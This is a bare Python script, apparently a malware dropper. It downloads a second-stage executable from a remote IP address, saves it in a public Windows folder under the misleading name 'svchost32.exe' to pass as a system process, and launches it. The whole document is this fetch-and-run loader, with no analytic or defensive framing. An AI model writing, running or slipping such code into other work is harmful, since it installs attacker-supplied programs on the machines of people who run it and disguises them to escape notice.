import urllib.request, subprocess
urllib.request.urlretrieve('http://192.0.2.10/stage2.exe', 'C:\\Users\\Public\\svchost32.exe')
subprocess.Popen(['C:\\Users\\Public\\svchost32.exe'], shell=False)